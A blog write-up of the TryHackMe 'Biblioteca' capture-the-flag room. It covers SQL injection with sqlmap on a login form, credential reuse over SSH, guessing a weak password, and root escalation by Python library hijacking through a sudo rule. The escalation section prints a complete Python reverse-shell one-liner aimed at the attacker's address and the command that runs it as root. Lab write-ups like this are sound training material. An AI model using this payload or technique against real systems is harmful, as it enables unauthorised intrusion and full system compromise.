---
title: "Biblioteca - TryHackMe"
date: 2022-05-23T20:20:50-03:00
---

https://tryhackme.com/room/biblioteca

## **User Flag**

First, we start by enumerating the ports and services.  
In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.

![biblioteca](/biblioteca/PortScan.png)

\
I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there.

![biblioteca](/biblioteca/Port8000.png)

![biblioteca](/biblioteca/UserLoggedIn.png)

\
Since the first page is a login page, I quickly try some SQL Injection with sqlmap, first by intercepting the POST request and then using it with the sqlmap command.

![biblioteca](/biblioteca/RequestIntercepted.png)

![biblioteca](/biblioteca/sqlmap.png)

\
We can observe that the parameter username is vulnerable so I start to retrieve informations from the database. You can see in the image above that the Database is called website.  

As this is a TryHackMe host probably the database is small, so to gain some time I use the flag –dump-all to dump everything from the website database.

![biblioteca](/biblioteca/DumpandoInfos.png)

\
Here I got a username and password and immediately try these credentials in SSH.

![biblioteca](/biblioteca/ssh-login.png)

\
Trying to find the flag, we see that it is in the hazel home and we don’t have permissions to read it. So, we need to find some way to login as hazel.

![biblioteca](/biblioteca/PermissaoNegada.png)

\
In this part I got stuck for a few minutes and I need to look at the hint. The hint was “Weak password”, so I just tried a simple password combination and “hazel”, same as the username, worked it.

Now logged as hazel, we just need to *cat* the user.txt and get the first flag.

![biblioteca](/biblioteca/flag-user.png)

## **Root Flag**

The first thing I do when I need to privilege escalation is to check the permissions with sudo and if there is something interesting in this user.

![biblioteca](/biblioteca/sudo-l.png)

\
We see that hazel can use the command python3 with root permissions in the file *hasher.py*.

Taking a look at this file, we see that there is a library being used: *hashlib*.

![biblioteca](/biblioteca/hasherPython.png)

\
Here we can do something that is called Python Library Hijacking. Basically, we just need to modify the library file and insert some malicious payload to get this payload executed by root.

This [article](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/) explains this exploration in a very clear way.

Since we don’t have permission to edit the current library file, we copied it to the /tmp directory.

![biblioteca](/biblioteca/libtmp.png)

\
Now we can edit it and insert a python reverse shell payload with our tun0 address.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.117.185",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![biblioteca](/biblioteca/payloadLib.png)

\
We need to execute the python file with the PYTHONPATH argument, to tell where python will search for the libraries included in the hasher.py. When we execute the hasher.py, it will call the library hashlib and since there is this playload in the library file, the reverse shell will be popped in our listener.

Remember to set your listener before executing the command.

```
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
```

![biblioteca](/biblioteca/comando.png)

\
Finally we obtain our reverse shell and just cat root.txt for the second flag.

![biblioteca](/biblioteca/flag-root.png)

See ya =).